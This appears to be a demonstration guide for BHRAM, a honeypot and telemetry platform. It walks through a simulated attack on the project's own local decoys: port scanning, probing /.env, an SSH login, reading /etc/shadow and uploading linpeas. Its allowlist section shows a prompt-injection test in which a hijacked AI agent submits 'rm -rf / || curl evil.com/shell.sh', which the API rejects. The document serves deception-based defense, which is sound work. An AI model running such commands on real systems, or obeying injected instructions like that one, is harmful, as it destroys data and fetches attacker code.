# BHRAM Demonstration & Attack Simulation Guide
## Phase 1 & Phase 2: Platform Execution, Attack Walkthrough, and Telemetry Verification

> **Behavioral Honeypot with Reactive-Adaptive Multi-Agent Intelligence**  
> Covers: **Phase 1 (Deception Infrastructure)** and **Phase 2 (Telemetry & Event Normalization)**

---

## Table of Contents

1. [Overview: What is Working Till Here](#1-overview-what-is-working-till-here)
2. [How to Run the Platform](#2-how-to-run-the-platform)
   - [Method A: Standalone Execution (No Docker Required)](#method-a-standalone-execution-no-docker-required)
   - [Method B: Containerized Execution (Full Docker Environment)](#method-b-containerized-execution-full-docker-environment)
3. [Running Automated Verification Tests](#3-running-automated-verification-tests)
4. [Step-by-Step Attacker Scenario (How the Attacker Attacks)](#4-step-by-step-attacker-scenario-how-the-attacker-attacks)
   - [Step 1: Reconnaissance & Port Scanning](#step-1-reconnaissance--port-scanning)
   - [Step 2: Web Decoy Reconnaissance & Honeytoken Probing](#step-2-web-decoy-reconnaissance--honeytoken-probing)
   - [Step 3: Web Credential Harvesting / Brute Force](#step-3-web-credential-harvesting--brute-force)
   - [Step 4: SSH Honeypot Intrusion](#step-4-ssh-honeypot-intrusion)
   - [Step 5: Interactive Discovery Commands](#step-5-interactive-discovery-commands)
   - [Step 6: High-Bait File Access & Honeytoken Discovery](#step-6-high-bait-file-access--honeytoken-discovery)
   - [Step 7: Staging & Malware Upload](#step-7-staging--malware-upload)
5. [Demonstrating What BHRAM Captured](#5-demonstrating-what-bhram-captured)
   - [A. Inspecting Immutable Forensic Flat Files](#a-inspecting-immutable-forensic-flat-files)
   - [B. Querying Telemetry via BHRAM API](#b-querying-telemetry-via-bhram-api)
   - [C. Reconstructing Attacker Session Timeline](#c-reconstructing-attacker-session-timeline)
   - [D. Consuming Events via AI/ML Interface](#d-consuming-events-via-aiml-interface)
   - [E. Demonstrating AI Decision Allowlist Security Boundary](#e-demonstrating-ai-decision-allowlist-security-boundary)
6. [Summary Checklist for Project Evaluation](#6-summary-checklist-for-project-evaluation)

---

## 1. Overview: What is Working Till Here

Through **Phase 1** and **Phase 2**, BHRAM provides:

| Layer | Component | Status | Function |
|---|---|---|---|
| **Decoy Surface** | `bhram_cowrie` | Active | SSH honeypot on port `2222` with fake Linux shell and honeyfs files |
| **Decoy Surface** | `bhram_web` | Active | Fictional company website on port `8080` (corporate pages, login, docs) |
| **Decoy Surface** | `bhram_fileserver` | Active | Decoy file management API on port `8081` with bait level scoring (1–5) |
| **Database** | `bhram_postgres` | Active | PostgreSQL 16 on internal network with relational + JSONB tables |
| **API** | `bhram_api` | Active | FastAPI management & AI interface on port `8000` |
| **Telemetry** | `bhram/telemetry/collectors` | Active | 4 collectors: Cowrie, Web, File server, Network |
| **Normalization** | `bhram/telemetry/normalizer` | Active | Sliding-window deduplication, MITRE ATT&CK TTP mapping, severity engine |
| **Forensics** | `bhram/telemetry/storage` | Active | Dual-write pipeline (append-only JSONL files + PostgreSQL `raw_events`) |
| **AI Interface** | `/api/v1/ai/*` | Active | Batched event consumption, attacker profiling, allowlist decision validation |

---

## 2. How to Run the Platform

You can demonstrate and run the platform in **two ways**:
- **Method A (Zero Docker Dependencies)**: Run unit tests and the safe synthetic demonstration engine locally in Python.
- **Method B (Full Container Stack)**: Launch the full multi-container deployment via Docker Compose.

---

### Method A: Standalone Execution (No Docker Required)

This method requires only Python 3.12+ and runs completely in memory and against local disk storage.

#### 1. Navigate to the project root and activate virtual environment:
```powershell
cd x:\BHRAM\MAIN
.venv\Scripts\Activate.ps1
```

#### 2. Run the automated test suite:
```powershell
cd bhram
python -m pytest -m unit -v
```
*Expected Result*: **58 passed** in < 0.3 seconds.

#### 3. Run the Demo Event Generator:
```powershell
python scripts/demo_generate_events.py --no-api
```

What this does:
1. Simulates an attacker conducting a multi-stage intrusion (port scan → web recon → SSH brute force → interactive commands → credential dumping → high-bait file exfiltration).
2. Normalizes all 31 events into canonical BHRAM format.
3. Automatically tags MITRE ATT&CK TTPs (`T1046`, `T1110`, `T1033`, `T1016`, `T1057`, `T1003`, `T1083`, `T1041`).
4. Writes immutable forensic flat files to `data/raw/` and `data/normalized/`.
5. Reconstructs and prints the complete session timeline in the terminal.

---

### Method B: Containerized Execution (Full Docker Environment)

When Docker Desktop or the Docker daemon is available:

#### 1. Configure Environment:
```bash
cd bhram
cp .env.example .env
```

#### 2. Start all containers:
```bash
docker compose up -d --build
# or using Makefile:
make up
```

#### 3. Verify services are healthy:
```bash
docker compose ps
curl http://localhost:8000/health
```

The health check response will return:
```json
{
  "status": "healthy",
  "app": "BHRAM API",
  "version": "1.0.0",
  "services": [
    {"name": "postgres", "status": "healthy"},
    {"name": "fileserver", "status": "healthy"}
  ]
}
```

---

## 3. Running Automated Verification Tests

BHRAM includes unit tests and end-to-end integration tests:

```bash
# 1. Run all unit tests (collectors, normalizer, schemas, security checks)
pytest -m unit -v

# 2. Run telemetry unit tests specifically
pytest telemetry/tests/test_telemetry.py -v

# 3. When Docker services are running, run integration tests:
pytest tests/test_telemetry_api.py -v
```

---

## 4. Step-by-Step Attacker Scenario (How the Attacker Attacks)

Here is the exact step-by-step walkthrough of how an external adversary attacks BHRAM, what the adversary observes, and what BHRAM captures behind the scenes.

```
Attacker Actions                         BHRAM Response & Telemetry Capture
────────────────                         ───────────────────────────────────
[Nmap Port Scan]               ──▶  [Network Collector]   ──▶ MITRE T1046 (Severity: Medium)
[HTTP Probe /.env, /robots]    ──▶  [Web Collector]       ──▶ Honeypot Probe (Severity: High)
[HTTP Login Brute Force]       ──▶  [Web Collector]       ──▶ MITRE T1110 (Severity: Medium)
[SSH Login on Port 2222]       ──▶  [Cowrie Collector]    ──▶ Session Created (Severity: Critical)
[Commands: whoami, id, ps]     ──▶  [Normalizer]          ──▶ MITRE T1033, T1057 (Severity Escalated)
[Credential Dump: /etc/shadow] ──▶  [Normalizer]          ──▶ MITRE T1003 (Severity: Critical)
[File Exfiltration: SQL/CSV]   ──▶  [File Collector]      ──▶ Honeytoken Bait Access (Severity: Critical)
```

---

### Step 1: Reconnaissance & Port Scanning

**Attacker Action**:  
The attacker probes the target host to discover exposed network services:
```bash
nmap -sS -p 22,80,443,2222,8080,8081 127.0.0.1
```

**Attacker Observes**:
- Port `2222/tcp`: Open (`OpenSSH 9.2p1 Debian`)
- Port `8080/tcp`: Open (`HTTP - Werkzeug/Flask`)
- Port `8081/tcp`: Filtered/Closed (bound to loopback only)
- Port `8000/tcp`: Filtered/Closed (bound to loopback only)
- Port `5432/tcp`: Closed (isolated in Docker `internal` network)

**What BHRAM Captures**:
- **Collector**: `SyntheticNetworkAdapter` / Network telemetry.
- **Canonical Event**: `port_scan`
- **Mitre ATT&CK Tag**: `T1046 - Network Service Scanning`
- **Severity**: `medium`
- **Raw Evidence Preserved**: Scanned port array `[22, 80, 443, 2222, 8080, ...]`.

---

### Step 2: Web Decoy Reconnaissance & Honeytoken Probing

**Attacker Action**:  
The attacker visits `http://localhost:8080` in their browser or uses `curl` to probe for hidden files and sensitive endpoints:
```bash
curl http://localhost:8080/
curl http://localhost:8080/robots.txt
curl http://localhost:8080/.env
curl http://localhost:8080/internal
curl http://localhost:8080/employee
```

**Attacker Observes**:
- Fictional corporate website for **"BHRAM Technologies"**.
- An employee directory showing usernames: `admin`, `developer`, `finance`, `it_support`.
- HTML source hints pointing to internal hostnames: `vpn.bhram-technologies.internal`.
- `404 Not Found` on `/.env` and `/robots.txt`.

**What BHRAM Captures**:
- **Collector**: `WebCollector`
- **Canonical Event**: `honeypot_detection_attempt` (for `/.env` and `/robots.txt`) and `web_request`
- **Severity**: Automatically elevated to `high` due to sensitive path traversal / configuration probe.
- **Actor Metadata**: Logs attacker `User-Agent` (e.g. `curl/8.4.0` or `sqlmap`).

---

### Step 3: Web Credential Harvesting / Brute Force

**Attacker Action**:  
The attacker attempts to submit credentials to the web login form:
```bash
curl -X POST http://localhost:8080/login \
     -d "username=admin&password=Password123!" \
     -H "Content-Type: application/x-www-form-urlencoded"
```

**Attacker Observes**:
- Web application responds with a realistic authentication failure message: `"Invalid username or password"`.

**What BHRAM Captures**:
- **Collector**: `WebCollector`
- **Canonical Event**: `credential_attempt`
- **Category**: `auth`
- **Mitre ATT&CK Tag**: `T1110 - Brute Force`
- **Actor Info**: `username: "admin"`

---

### Step 4: SSH Honeypot Intrusion

**Attacker Action**:  
Having discovered SSH on port 2222 and valid usernames from the employee directory, the attacker connects:
```bash
ssh admin@127.0.0.1 -p 2222
# Password: any password (e.g. "admin" or "Password123")
```

**Attacker Observes**:
- Authentication succeeds!
- A realistic corporate Linux terminal banner appears:
  ```
  Linux bhram-prod-srv01 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC
  Last login: Sun Oct 04 18:20:12 2026 from 10.10.10.50
  admin@bhram-prod-srv01:~$
  ```

**What BHRAM Captures**:
- **Collector**: `CowrieCollector`
- **Canonical Event**: `session_start` followed by `authentication` (`outcome: success`).
- **Severity**: `critical` (attacker breached authentication).
- **Session Correlator**: Spawns a correlated `session_id` tracking the attacker's source IP and timestamp.

---

### Step 5: Interactive Discovery Commands

**Attacker Action**:  
The attacker explores the compromised host to orient themselves:
```bash
whoami
id
uname -a
ifconfig
ps aux
ls -la
```

**Attacker Observes**:
- Simulated output for user `admin` (UID 1000).
- Fake processes and network interfaces populated by Cowrie's `honeyfs`.

**What BHRAM Captures**:
- **Collector**: `CowrieCollector`
- **Canonical Event**: Multiple `command` events.
- **Dynamic MITRE Tagging**:
  - `whoami`, `id` → `T1033 - System Owner Discovery`
  - `ifconfig` → `T1016 - System Network Configuration Discovery`
  - `ps aux` → `T1057 - Process Discovery`
- **Dynamic Severity Escalation**: As command count passes threshold (>5 commands), session threat score escalates to `high`.

---

### Step 6: High-Bait File Access & Honeytoken Discovery

**Attacker Action**:  
The attacker searches for credentials and sensitive documents:
```bash
find / -name "*.sql" 2>/dev/null
cat /home/admin/backup/database_backup.sql
cat /etc/shadow
```

**Attacker Observes**:
- A convincing fake SQL database dump containing hashed passwords for fictional users.
- A fake `/etc/shadow` file.

**What BHRAM Captures**:
- **Collector**: `CowrieCollector` + `FileCollector`
- **Canonical Event**: `file_access` and `command` (`action: "cat /etc/shadow"`).
- **Mitre ATT&CK Tag**: `T1003 - OS Credential Dumping`
- **Honeytoken Bait Level**: Files in `honeyfs/home/admin/backup/` have `bait_level=5`.
- **Severity**: Elevated to `critical`.

---

### Step 7: Staging & Malware Upload

**Attacker Action**:  
The attacker attempts to upload a recon or persistence script:
```bash
# Attacker uploads linpeas.sh via SFTP/SCP or Cowrie download simulation
```

**Attacker Observes**:
- Upload completes successfully into `/tmp/linpeas.sh`.

**What BHRAM Captures**:
- **Collector**: `CowrieCollector` (`cowrie.session.file_upload`)
- **Canonical Event**: `file_create`
- **Mitre ATT&CK Tag**: `T1083 - File and Directory Discovery`
- **Storage**: Uploaded file metadata and cryptographic hash saved to forensic records.

---

## 5. Demonstrating What BHRAM Captured

### A. Inspecting Immutable Forensic Flat Files

All activity generated during attacks is immediately written to append-only JSONL files organized by date:

```powershell
# View generated raw log lines:
Get-Content -Path x:\BHRAM\MAIN\bhram\data\raw\2026\10\04\cowrie.jsonl -TotalCount 5

# View generated canonical normalized events:
Get-Content -Path x:\BHRAM\MAIN\bhram\data\normalized\2026\10\04\events.jsonl -TotalCount 3
```

Each normalized event line contains the full JSON structure:
```json
{
  "event_id": "b36e64b4-a997-4d29-81d3-e2b25befb4ca",
  "timestamp": "2026-10-04T13:46:23.067725+00:00",
  "session_id": "demo-98a37daa",
  "source_ip": "10.10.10.50",
  "source": {"component": "cowrie", "version": "cowrie-2.x"},
  "event": {"type": "command", "category": "ssh", "action": "cat /etc/shadow", "outcome": "success"},
  "actor": {"username": "admin", "session_id": "demo-98a37daa"},
  "target": {"service": "ssh"},
  "severity": "critical",
  "metadata": {"ttps": ["T1003 - OS Credential Dumping"]}
}
```

---

### B. Querying Telemetry via BHRAM API

When services are running, the API provides instant telemetry insights:

```bash
# 1. Pipeline volume & breakdown:
curl http://localhost:8000/api/v1/telemetry/stats

# Response:
# {
#   "total_events": 31,
#   "total_sessions": 5,
#   "active_sessions": 1,
#   "events_by_type": {"command": 10, "web_request": 7, "authentication": 3, ...},
#   "events_by_severity": {"critical": 5, "high": 8, "medium": 12, "low": 6},
#   "top_source_ips": [{"source_ip": "10.10.10.50", "event_count": 31}]
# }
```

---

### C. Reconstructing Attacker Session Timeline

```bash
# Query the chronological timeline of a specific attack session:
curl http://localhost:8000/api/v1/sessions/{session_id}/timeline
```
Returns every action in exact sequence:
1. `session_start`
2. `authentication` (`outcome: failure`)
3. `authentication` (`outcome: success`)
4. `command` (`whoami`)
5. `command` (`cat /etc/shadow`)
6. `file_access` (`database_backup.sql`)
7. `session_end`

---

### D. Consuming Events via AI/ML Interface

External AI/ML agents query unanalyzed events batch by batch:
```bash
# Fetch 10 oldest unanalyzed events:
curl "http://localhost:8000/api/v1/ai/events?limit=10"
```

The AI agent builds an attacker profile and submits it:
```bash
curl -X POST http://localhost:8000/api/v1/ai/profile \
     -H "Content-Type: application/json" \
     -d '{
       "source_ip": "10.10.10.50",
       "session_id": "b36e64b4-a997-4d29-81d3-e2b25befb4ca",
       "skill_level": "intermediate",
       "suspected_intent": "credential_harvesting",
       "observed_ttps": ["T1046", "T1003", "T1083"],
       "suspicion_score": 0.85,
       "behavior_summary": "Attacker performed recon and attempted shadow file access"
     }'
```

---

### E. Demonstrating AI Decision Allowlist Security Boundary

The AI agent submits an allowlisted deception action:
```bash
# Approved allowlisted action:
curl -X POST http://localhost:8000/api/v1/ai/decision \
     -H "Content-Type: application/json" \
     -d '{
       "session_id": "b36e64b4-a997-4d29-81d3-e2b25befb4ca",
       "action": "add_decoy_file",
       "parameters": {"filename": "aws_keys.txt", "bait_level": 5},
       "reasoning": "Attacker is looking for credentials; plant high-bait honeytoken"
     }'
# Response: HTTP 201 Created (Recorded in deception_actions table)
```

**Security Guardrail Demonstration**:  
If prompt injection causes the agent to submit an unapproved command:
```bash
curl -X POST http://localhost:8000/api/v1/ai/decision \
     -H "Content-Type: application/json" \
     -d '{
       "session_id": "b36e64b4-a997-4d29-81d3-e2b25befb4ca",
       "action": "rm -rf / || curl evil.com/shell.sh",
       "parameters": {},
       "reasoning": "Malicious or hijacked request"
     }'
```
**Response**:
```json
HTTP/1.1 422 Unprocessable Entity
{
  "detail": "Action 'rm -rf / || curl evil.com/shell.sh' is not in the BHRAM allowlist. Valid actions: add_decoy_file, modify_decoy_content, delay_response, simulate_service_crash, escalate_privilege_fake, inject_fake_process, isolate_session, log_forensic_snapshot, change_deception_mode, alert_operator"
}
```
Arbitrary shell execution is completely prevented.

---

## 6. Summary Checklist for Project Evaluation

| Evaluation Criteria | Verification Command | Verified Status |
|---|---|---|
| **Unit Test Coverage** | `python -m pytest -m unit -v` | **58 / 58 Passed** |
| **Telemetry Ingestion** | `python scripts/demo_generate_events.py --no-api` | **31 Canonical Events Generated** |
| **Forensic Files** | `dir data\raw`, `dir data\normalized` | **JSONL logs written on disk** |
| **MITRE ATT&CK Tagging** | Inspected in `events.jsonl` output | **8+ TTPs dynamically identified** |
| **Allowlist Security** | Tested via unit test & API validator | **Strict HTTP 422 on injection** |
| **Isolation Architecture** | Inspected in `compose.yaml` | **PostgreSQL on internal-only net** |
